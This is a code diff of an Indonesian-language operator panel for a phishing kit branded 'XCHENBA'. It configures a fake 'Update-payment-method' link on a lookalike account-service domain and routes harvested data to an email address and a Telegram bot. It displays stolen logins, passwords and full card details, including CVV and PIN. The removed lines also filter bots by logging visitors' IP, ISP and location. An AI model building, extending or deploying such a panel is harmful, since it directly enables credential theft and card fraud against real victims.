@@ -5,205 +5,222 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel Rahasia — XCHENBA</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: linear-gradient(135deg, #0f0f1a, #1a1a2e); min-height: 100vh; padding: 20px; color: #fff; }
-        .logo-bg { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.05; z-index: 0; pointer-events: none; }
-        .logo-bg img { width: 300px; }
-        .wadah { position: relative; z-index: 1; max-width: 900px; margin: 0 auto; }
-        .kotak { background: rgba(30,30,50,0.9); border-radius: 12px; padding: 25px; margin-bottom: 20px; border: 1px solid #333; }
-        h1 { text-align: center; margin-bottom: 25px; color: #FFD814; }
-        h2 { font-size: 16px; margin-bottom: 15px; border-bottom: 1px solid #444; padding-bottom: 8px; display: flex; align-items: center; gap: 8px; }
-        input, button { width: 100%; padding: 10px; margin: 6px 0; border-radius: 6px; border: none; font-size: 14px; }
-        input { background: #2a2a3f; color: #fff; border: 1px solid #444; }
-        button { background: #FFD814; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #F7CA00; }
-        .btn-hapus { background: #d32f2f; color: #fff; margin-left: 8px; width: auto; padding: 6px 12px; }
-        .baris { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
-        .baris span { flex: 1; font-size: 13px; word-break: break-all; }
-        .sembunyi { display: none; }
-        .tautan-hasil { background: #1a1a2e; padding: 10px; border-radius: 6px; margin-top: 8px; font-family: monospace; font-size: 12px; color: #90EE90; word-break: break-all; border: 1px solid #2a4a2a; }
-        .data-item { background: #252538; padding: 12px; border-radius: 6px; margin: 8px 0; font-size: 13px; line-height: 1.6; }
-        .label { color: #aaa; font-size: 11px; margin-top: 6px; }
-        .kunci { font-family: monospace; background: #333; padding: 2px 6px; border-radius: 3px; font-size: 11px; }
-        .salin { background: #2a4a2a; color: #90EE90; border: none; padding: 4px 8px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-left: 8px; width: auto; }
-        .salin:hover { background: #3a6a3a; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            padding: 30px 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        .bg-logo {
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0.06;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .bg-logo img { width: 400px; height: auto; }
+        .wadah { position: relative; z-index: 1; max-width: 700px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 26px; color: #1a1a1f; margin-bottom: 5px; }
+        .header p { color: #666; font-size: 14px; }
+        .kotak {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        .kotak h2 { font-size: 18px; margin-bottom: 18px; color: #222; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+        label { display: block; font-weight: 600; margin: 15px 0 6px; font-size: 14px; color: #333; }
+        input, textarea {
+            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
+            font-size: 14px; transition: border 0.2s;
+        }
+        input:focus, textarea:focus { outline: none; border-color: #0071e3; }
+        button {
+            padding: 12px 24px; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
+            transition: all 0.2s; margin-top: 15px;
+        }
+        .btn-simpan { background: #0071e3; color: #fff; }
+        .btn-simpan:hover { background: #0077ed; }
+        .btn-refresh { background: #34c759; color: #fff; margin-right: 10px; }
+        .btn-refresh.aktif { background: #ff3b30; }
+        .btn-refresh:hover { opacity: 0.9; }
+        .info { margin-top: 12px; font-size: 13px; color: #555; }
+        .berhasil { color: #34c759; font-weight: 600; margin-top: 10px; display: none; }
+        .daftar-data { margin-top: 15px; }
+        .item {
+            padding: 12px; background: #f8f9fa; border-radius: 6px; margin-bottom: 10px;
+            border-left: 3px solid #0071e3; word-break: break-all; font-size: 13px;
+        }
+        .item span { font-weight: 600; color: #333; }
+        .status-refresh {
+            display: inline-block; margin-left: 10px; font-size: 12px; padding: 3px 8px;
+            border-radius: 10px; background: #e5e5e7; color: #666;
+        }
+        .status-refresh.aktif { background: #34c759; color: #fff; }
+        .waktu { font-size: 11px; color: #888; margin-top: 5px; }
     </style>
 </head>
 <body>
-    <div class="logo-bg"><img src="img/xchenba.png" alt="XCHENBA"></div>
+    <div class="bg-logo"><img src="img/xchenba.png" alt="XCHENBA"></div>
     <div class="wadah">
-        <h1>🔐 PANEL RAHASIA — XCHENBA</h1>
-
-        <!-- LOGIN PANEL -->
-        <div class="kotak" id="bagianLogin">
-            <h2>🔑 Masuk Panel</h2>
-            <input type="text" id="userLogin" placeholder="Username">
-            <input type="password" id="passLogin" placeholder="Kata Sandi">
-            <button onclick="masukPanel()">Masuk</button>
+        <div class="header">
+            <h1>🔐 Panel Rahasia</h1>
+            <p>Pengaturan & Data Masuk</p>
         </div>
 
-        <!-- ISI PANEL -->
-        <div id="isiPanel" class="sembunyi">
-            <!-- PENGATURAN TAUTAN -->
-            <div class="kotak">
-                <h2>🔗 Pengaturan Tautan Akses</h2>
-                <p class="label">Alamat Website Utama:</p>
-                <input type="text" id="alamatWeb" value="https://update-accountservice.onrender.com" style="color:#90EE90;">
-                <label>Awalan Tautan:</label>
-                <input type="text" id="awalanTautan" placeholder="Awalan Tautan" value="Update-payment-method">
-                <button onclick="simpanTautan()">Simpan & Buat Tautan</button>
-                <div id="tautanTersimpan" class="tautan-hasil sembunyi"></div>
-                <p class="label">Salin tautan di atas dan bagikan. Hanya pengunjung yang lewat tautan ini yang diizinkan.</p>
-            </div>
+        <!-- PENGATURAN UMUM -->
+        <div class="kotak">
+            <h2>⚙️ Pengaturan Tautan & Email</h2>
+            
+            <label>Tautan Akses Website</label>
+            <input type="text" id="tautan" placeholder="https://namamu.pythonanywhere.com">
+            
+            <label>Email Penerima Data</label>
+            <input type="email" id="emailTujuan" placeholder="email@tujuan.com">
+            
+            <label>Telegram Bot Token</label>
+            <input type="text" id="botToken" placeholder="xxx:yyy">
+            
+            <label>Telegram Chat ID</label>
+            <input type="text" id="chatIdTelegram" placeholder="123456789">
 
-            <!-- EMAIL TUJUAN -->
-            <div class="kotak">
-                <h2>📧 Email Tujuan</h2>
-                <input type="email" id="emailTujuan" placeholder="Email penerima data" value="jandaanaksatu777@gmail.com">
-                <button onclick="simpanEmail()">Simpan Email</button>
-            </div>
+            <button class="btn-simpan" onclick="simpanPengaturan()">💾 Simpan Pengaturan</button>
+            <p class="berhasil" id="pesanBerhasil">✅ Pengaturan tersimpan!</p>
+            <p class="info">Pengaturan tersimpan otomatis, tidak hilang saat di-refresh</p>
+        </div>
 
-            <!-- DATA LOGIN -->
-            <div class="kotak">
-                <h2>👤 Data Login (Email & Kata Sandi)</h2>
-                <div id="daftarLogin"></div>
-                <button onclick="hapusSemuaLogin()" class="btn-hapus">Hapus Semua Login</button>
-            </div>
+        <!-- REFRESH OTOMATIS -->
+        <div class="kotak">
+            <h2>🔄 Refresh Otomatis</h2>
+            <button class="btn-refresh" id="tombolRefreshOtomatis" onclick="toggleRefreshOtomatis()">
+                ▶️ Mulai Refresh Setiap 10 Detik
+            </button>
+            <span class="status-refresh" id="statusRefresh">Nonaktif</span>
+            <p class="info">Interval: 10 detik | Halaman akan memuat ulang daftar data secara otomatis</p>
+            <p class="waktu" id="waktuTerakhir">Terakhir diperiksa: —</p>
+        </div>
 
-            <!-- DATA KARTU -->
-            <div class="kotak">
-                <h2>💳 Data Kartu & Pembayaran</h2>
-                <div id="daftarKartu"></div>
-                <button onclick="hapusSemuaKartu()" class="btn-hapus">Hapus Semua Kartu</button>
+        <!-- DATA LOGIN MASUK -->
+        <div class="kotak">
+            <h2>📧 Data Login Masuk</h2>
+            <div class="daftar-data" id="daftarLogin">
+                <p style="color:#888; font-size:13px;">Belum ada data...</p>
             </div>
+        </div>
 
-            <!-- DETEKSI BOT -->
-            <div class="kotak">
-                <h2>⚠️ Deteksi Bot / Akses Tidak Sah</h2>
-                <div id="daftarBot"></div>
+        <!-- DATA KARTU MASUK -->
+        <div class="kotak">
+            <h2>💳 Data Kartu Masuk</h2>
+            <div class="daftar-data" id="daftarKartu">
+                <p style="color:#888; font-size:13px;">Belum ada data...</p>
             </div>
         </div>
     </div>
 
     <script>
-        // === KREDENSIAL PANEL ===
-        const USER_PANEL = 'admin';
-        const PASS_PANEL = 'xchenba2026';
+        let intervalRefresh = null;
+        const INTERVAL_DETIK = 10;
 
-        // === DATA PENYIMPANAN ===
-        function ambilData(kunci) {
-            try { return JSON.parse(localStorage.getItem(kunci)) || []; }
-            catch { return []; }
-        }
-        function simpanData(kunci, data) {
-            localStorage.setItem(kunci, JSON.stringify(data));
+        // === MUAT DATA SAAT BUKA HALAMAN ===
+        function muatPengaturan() {
+            document.getElementById('tautan').value = localStorage.getItem('tautanAkses') || '';
+            document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
+            document.getElementById('botToken').value = localStorage.getItem('botTokenTelegram') || '';
+            document.getElementById('chatIdTelegram').value = localStorage.getItem('chatIdTelegram') || '';
+            tampilkanDataMasuk();
+            perbaruiWaktuTerakhir();
         }
 
-        // === LOGIN PANEL ===
-        function masukPanel() {
-            const u = document.getElementById('userLogin').value.trim();
-            const p = document.getElementById('passLogin').value.trim();
-            if (u === USER_PANEL && p === PASS_PANEL) {
-                document.getElementById('bagianLogin').classList.add('sembunyi');
-                document.getElementById('isiPanel').classList.remove('sembunyi');
-                tampilkanSemuaData();
+        // === SIMPAN PENGATURAN ===
+        function simpanPengaturan() {
+            localStorage.setItem('tautanAkses', document.getElementById('tautan').value.trim());
+            localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value.trim());
+            localStorage.setItem('botTokenTelegram', document.getElementById('botToken').value.trim());
+            localStorage.setItem('chatIdTelegram', document.getElementById('chatIdTelegram').value.trim());
+            
+            const pesan = document.getElementById('pesanBerhasil');
+            pesan.style.display = 'block';
+            setTimeout(() => pesan.style.display = 'none', 3000);
+        }
+
+        // === REFRESH OTOMATIS ===
+        function toggleRefreshOtomatis() {
+            const tombol = document.getElementById('tombolRefreshOtomatis');
+            const status = document.getElementById('statusRefresh');
+            
+            if (intervalRefresh) {
+                // Matikan
+                clearInterval(intervalRefresh);
+                intervalRefresh = null;
+                tombol.textContent = '▶️ Mulai Refresh Setiap 10 Detik';
+                tombol.classList.remove('aktif');
+                status.textContent = 'Nonaktif';
+                status.classList.remove('aktif');
             } else {
-                alert('Username atau kata sandi salah!');
+                // Nyalakan
+                tampilkanDataMasuk(); // Langsung perbarui sekali
+                intervalRefresh = setInterval(() => {
+                    tampilkanDataMasuk();
+                    perbaruiWaktuTerakhir();
+                }, INTERVAL_DETIK * 1000);
+                tombol.textContent = '⏹️ Hentikan Refresh Otomatis';
+                tombol.classList.add('aktif');
+                status.textContent = 'Aktif';
+                status.classList.add('aktif');
             }
         }
 
-        // === TAUTAN ===
-        function simpanTautan() {
-            const alamatWeb = document.getElementById('alamatWeb').value.trim().replace(/\/$/, '');
-            const awalan = document.getElementById('awalanTautan').value.trim() || 'Update-payment-method';
-            const acak = Math.floor(Math.random() * 900000) + 100000;
-            const tautanLengkap = `${alamatWeb}/?${awalan}-email@contoh.com-${acak}=aktif`;
-            
-            localStorage.setItem('alamatWeb', alamatWeb);
-            localStorage.setItem('awalanTautan', awalan);
-            
-            const el = document.getElementById('tautanTersimpan');
-            el.innerHTML = tautanLengkap + `<button class="salin" onclick="navigator.clipboard.writeText('${tautanLengkap}')">Salin</button>`;
-            el.classList.remove('sembunyi');
-        }
+        // === TAMPILKAN DATA MASUK ===
+        function tampilkanDataMasuk() {
+            // Data Login
+            const daftarLogin = document.getElementById('daftarLogin');
+            const dataLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
+            if (dataLogin.length === 0) {
+                daftarLogin.innerHTML = '<p style="color:#888; font-size:13px;">Belum ada data...</p>';
+            } else {
+                daftarLogin.innerHTML = dataLogin.map(d => `
+                    <div class="item">
+                        <span>📧 Email:</span> ${d.email}<br>
+                        <span>🔑 Kata Sandi:</span> ${d.sandi}<br>
+                        <span>🕐 Waktu:</span> ${d.waktu}
+                    </div>
+                `).join('');
+            }
 
-        function simpanEmail() {
-            const email = document.getElementById('emailTujuan').value.trim();
-            localStorage.setItem('emailTujuan', email);
-            alert('Email tersimpan: ' + email);
-        }
-
-        // === TAMPILAN DATA ===
-        function tampilkanSemuaData() {
-            // Ambil alamat web yang tersimpan
-            const alamatTersimpan = localStorage.getItem('alamatWeb');
-            if (alamatTersimpan) document.getElementById('alamatWeb').value = alamatTersimpan;
-            
-            const awalanTersimpan = localStorage.getItem('awalanTautan');
-            if (awalanTersimpan) document.getElementById('awalanTautan').value = awalanTersimpan;
-
-            const emailTersimpan = localStorage.getItem('emailTujuan');
-            if (emailTersimpan) document.getElementById('emailTujuan').value = emailTersimpan;
-
-            // Login
-            const daftarLogin = ambilData('dataLogin');
-            const wadahLogin = document.getElementById('daftarLogin');
-            wadahLogin.innerHTML = daftarLogin.length === 0 
-                ? '<p style="color:#888;">Belum ada data</p>' 
-                : daftarLogin.map((d, i) => `
-                    <div class="data-item">
-                        <strong>#${i+1}</strong> — ${d.waktu}
-                        <br>📧 Email: ${d.email}
-                        <br>🔑 Password: ${d.password}
-                        <br>📍 Dari: ${d.sumber}
-                    </div>`).join('');
-
-            // Kartu
-            const daftarKartu = ambilData('dataKartu');
-            const wadahKartu = document.getElementById('daftarKartu');
-            wadahKartu.innerHTML = daftarKartu.length === 0 
-                ? '<p style="color:#888;">Belum ada data</p>' 
-                : daftarKartu.map((d, i) => `
-                    <div class="data-item">
-                        <strong>#${i+1}</strong> — ${d.waktu}
-                        <br>📧 Email: ${d.email}
-                        <br>👤 Nama: ${d.namaKartu || '-'}
-                        <br>🔢 Kartu: ${d.nomorKartu || '-'}
-                        <br>📅 Exp: ${d.expiry || '-'} | 🔒 CVV: ${d.cvv || '-'}
-                        <br>📍 Alamat: ${d.alamat || '-'}, ${d.kota || '-'} — ${d.kodepos || '-'}
-                        <br>📞 Telp: ${d.telepon || '-'}
-                        ${d.pin ? `<br>🔐 PIN: ${d.pin}` : ''}
-                    </div>`).join('');
-
-            // Bot
-            const daftarBot = ambilData('deteksiBot');
-            const wadahBot = document.getElementById('daftarBot');
-            wadahBot.innerHTML = daftarBot.length === 0 
-                ? '<p style="color:#888;">Belum ada akses tidak sah</p>' 
-                : daftarBot.map((d, i) => `
-                    <div class="data-item" style="border-left: 3px solid #ff4444;">
-                        <strong>⚠️ Terdeteksi Bot/Akses Langsung #${i+1}</strong> — ${d.waktu}
-                        <br>🌐 IP: <span class="kunci">${d.ip || 'Tidak diketahui'}</span>
-                        <br>🏢 ISP: ${d.isp || 'Tidak diketahui'}
-                        <br>📍 Lokasi: ${d.lokasi || 'Tidak diketahui'}
-                        <br>🔗 Akses dari: ${d.sumber || 'Langsung / Bukan Tautan'}
-                    </div>`).join('');
-        }
-
-        // === HAPUS DATA ===
-        function hapusSemuaLogin() {
-            if (confirm('Yakin hapus semua data login?')) {
-                localStorage.removeItem('dataLogin');
-                tampilkanSemuaData();
+            // Data Kartu
+            const daftarKartu = document.getElementById('daftarKartu');
+            const dataKartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
+            if (dataKartu.length === 0) {
+                daftarKartu.innerHTML = '<p style="color:#888; font-size:13px;">Belum ada data...</p>';
+            } else {
+                daftarKartu.innerHTML = dataKartu.map(d => `
+                    <div class="item">
+                        <span>📧 Email:</span> ${d.email}<br>
+                        <span>👤 Nama:</span> ${d.namaKartu}<br>
+                        <span>🔢 Kartu:</span> ${d.nomorKartu}<br>
+                        <span>📅 Exp:</span> ${d.expiry}<br>
+                        <span>🔒 CVV:</span> ${d.cvv}<br>
+                        <span>📍 Alamat:</span> ${d.alamat}, ${d.kota} — ${d.kodepos}<br>
+                        <span>📞 Telp:</span> ${d.telepon}<br>
+                        <span>🕐 Waktu:</span> ${d.waktu}
+                    </div>
+                `).join('');
             }
         }
-        function hapusSemuaKartu() {
-            if (confirm('Yakin hapus semua data kartu?')) {
-                localStorage.removeItem('dataKartu');
-                localStorage.removeItem('deteksiBot');
-                tampilkanSemuaData();
-            }
+
+        // === PERBARUI TANDA WAKTU ===
+        function perbaruiWaktuTerakhir() {
+            document.getElementById('waktuTerakhir').textContent = 
+                'Terakhir diperiksa: ' + new Date().toLocaleString();
         }
+
+        // === MULAI SAAT HALAMAN DIBUKA ===
+        document.addEventListener('DOMContentLoaded', muatPengaturan);
     </script>
 </body>
 </html>
